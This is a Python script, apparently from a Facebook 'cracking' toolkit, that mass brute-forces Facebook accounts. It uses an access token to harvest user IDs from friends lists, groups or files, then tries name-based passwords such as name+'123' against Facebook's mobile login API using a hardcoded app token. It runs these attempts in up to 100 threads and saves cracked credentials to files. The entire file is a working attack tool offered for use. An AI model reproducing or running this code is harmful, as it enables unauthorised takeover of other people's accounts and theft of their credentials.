#!usr/bin/python3.7
#Author: DulLah ©2019
#contact: fb.me/dulahz
#github: github.com/dz-id

import os, sys, time, requests, json, random
from multiprocessing.pool import ThreadPool

global W, G, R, Y, __ua__
if sys.platform in ['linux','linux2']:
	W = '\033[0m'
	G = '\033[1;92m'
	R = '\033[1;91m'
	Y = '\033[1;93m'
else:
	W = ''
	G = ''
	R = ''
	Y = ''
	
class Brute:
	def __init__(self):
		self.loop = 0
		self.HD = {'User-Agent' : open('UserAgent/ua.txt').read()}
		self.token = open('log/token').read()
		self.id = []
		self.cek = []
		self.found = []
		self.Main()
	
	def Execute(self,target):
		try:
			self.loop +=1
			a = requests.get('https://graph.facebook.com/' + target + '?access_token=' + self.token, headers = self.HD)
			z = json.loads(a.text)
			name = z['first_name']
			
			for pw in [name+'123',name+'1234',name+'12345',self.pas]:
				url = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + target + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
				data = requests.get(url)
				jz = json.loads(data.text)
				
				if 'access_token' in jz:
					ok = '%s|%s'%(target,pw)
					self.found.append(ok)
					p = open('result/crack/ok.txt','a')
					p.write(ok+'\n')
					p.close()
					print(G + '\r  √ ' + W + str(ok) + '          ')
					break
				
				elif 'www.facebook.com' in jz['error_msg']:
					cp = '%s|%s'%(target,pw)
					self.cek.append(cp)
					e = open('result/crack/cp.txt','a')
					e.write(cp+'\n')
					e.close()
					print(Y + '\r  + ' + W + str(cp) + '          ')
					break
			
			print(W + '\r[' + G + '*' + W + '] CRACKING {:.2f}%'.format(self.loop/len(self.id)*100)+' OK:-' + G + str(len(self.found)) + W + ' CP:-' + Y + str(len(self.cek)) + W + '  ',end = '');sys.stdout.flush()
		except:pass
		
	def Results(self):
		print('')
		if len(self.found) !=0:
			print(W + '[' + G + '#' + W + '] ok saved : ' + G + 'result/crack/ok.txt')
		if len(self.cek) !=0:
			print(W + '[' + G + '#' + W + '] cp saved : ' + Y + 'result/crack/cp.txt')
		if len(self.found) == 0 and len(self.cek) == 0:
			print(W + '[' + R + '!' + W + '] ' + R + 'no results found!')
			
	def Threads(self):
		try:
			
			threads = int(input(W + '\n[' + G + '?' + W + '] threads 1-100 : ' + G))
			if threads >100:
				print(W + '[' + R + '!' + W + '] ' + R + 'exceeds the limit!')
				self.Threads()
			cek = input(W + '[' + G + '?' + W + '] do you want extra password? [y/n] : ' + G)
			
			if cek.lower() == 'y':
				self.pas = input(W + '[' + G + '?' + W + '] extra password : ' + G)
			else:
				self.pas = ''
				
		except ValueError:
			print(W + '[' + R + '!' + W + '] ' + R + 'enter the numbers!')
			self.Threads()
		
		m = ThreadPool(threads)
		m.map(self.Execute,self.id)
		self.Results()
		sys.exit()
	
	def Get(self,url_a):
		
		z = requests.get(url_a,headers = self.HD)
		result = json.loads(z.text)
					
		for x in result['data']:
			self.id.append(x['id'])
			print(W + '\r[' + G + '•' + W + '] [' + R + str(len(self.id)) + W + '] GET id... ',end = '');sys.stdout.flush();time.sleep(0.001)
				
		if 'next' in str(result):
			self.Get(result['paging']['next'])
				
		if len(self.id) == 0:
			print(W + '[' + R + '!' + W + '] ' + R + 'no user id found!')
			sys.exit()
		else:
			pass
		
	def Brt(self):
		try:
			if self.e == '1':
				print()
				
				r = requests.get('https://graph.facebook.com/me/friends?access_token=' + self.token, headers = self.HD)
				result = json.loads(r.text)
				
				for x in result['data']:
					self.id.append(x['id'])
					print(W + '\r[' + G + '•' + W + '] [' + R + str(len(self.id)) + W + '] GET id... ',end = '');sys.stdout.flush();time.sleep(0.001)
				
				if len(self.id) == 0:
					print(W + '[' + R + '!' + W + '] ' + R + 'no user id found!')
					sys.exit()
			
			elif self.e == '2':
				
				target = input(W + '\n[' + G + '?' + W + '] enter friends id : ' + G)
				a = requests.get('https://graph.facebook.com/' + target + '?access_token=' + self.token, headers = self.HD)
					
				r = json.loads(a.text)
				name = r['name']
					
				print(W + '[' + G + '+' + W + '] id from : ' + G + name)
					
				z = requests.get('https://graph.facebook.com/' + target + '/friends?access_token=' + self.token, headers = self.HD)
				result = json.loads(z.text)
					
				for x in result['data']:
					self.id.append(x['id'])
					print(W + '\r[' + G + '•' + W + '] [' + R + str(len(self.id)) + W + '] GET id... ',end = '');sys.stdout.flush();time.sleep(0.001)
				
				if len(self.id) == 0:
					print(W + '[' + R + '!' + W + '] ' + R + 'no user id found!')
					sys.exit()
			
			elif self.e == '3':
				
				groups = input(W + '\n[' + G + '?' + W + '] enter groups id : ' + G)
				a = requests.get('https://graph.facebook.com/group/?id=' + groups + '&access_token=' + self.token, headers = self.HD)
					
				r = json.loads(a.text)
				name = r['name']
					
				print(W + '[' + G + '+' + W + '] id from : ' + G + name)
				
				self.Get('https://graph.facebook.com/' + groups + '/members?fields=id&limit=5000&access_token=' + self.token)
			
			elif self.e == '4':
				
				file = input(W + '\n[' + G + '?' + W + '] lists id : ' + G)
				
				for res in open(file).readlines():
					self.id.append(res.strip())
					print(W + '\r[' + G + '•' + W + '] [' + R + str(len(self.id)) + W + '] GET id... ',end = '');sys.stdout.flush();time.sleep(0.0001)
				
				if len(self.id) == 0:
					print(W + '[' + R + '!' + W + '] ' + R + 'no user id found!')
					sys.exit()
					
		except KeyError:
			print(W + '\n[' + R + '!' + W + '] ' + R + 'error when grabbing id!')
			print(W + '[' + R + '!' + W + '] ' + R + 'stopped!')
			sys.exit()
			
		except IOError:
			print(W + '[' + R + '!' + W + '] ' + R + 'files not found!')
			sys.exit()
			
		except requests.exceptions.ConnectionError:
			print(W + '\n[' + R + '!' + W + '] ' + R + 'connections error!')
			print(W + '[' + R + '!' + W + '] ' + R + 'stopped!')
			sys.exit()
		
		self.Threads()
		
	def Main(self):
		
		cek = input(W + '\n[ ' + R + 'Dz' + W +' ]•> ' + G)
		
		if cek in ['1','01']:
			self.e = '1'
			self.Brt()
		elif cek in ['2','02']:
			self.e = '2'
			self.Brt()
		elif cek in ['3','03']:
			self.e = '3'
			self.Brt()
		elif cek in ['4','04']:
			self.e = '4'
			self.Brt()
		elif cek in ['0','00']:
			os.system('python Fb.py')
		else:
			print(W + '[' + R + '!' + W + '] ' + R + 'you stuppid!')

try:
	os.mkdir('result')
except:pass
try:
	os.mkdir('result/crack')
except:pass

print(W + '\n  {' + G + '01' + W + '} Crack From My Friends')
print(W + '  {' + G + '02' + W + '} Crack From Friends Id')
print(W + '  {' + G + '03' + W + '} Crack From Groups Id')
print(W + '  {' + G + '04' + W + '} Crack Using Files')
print(W + '  {' + R + '00' + W + '} Back')

Brute()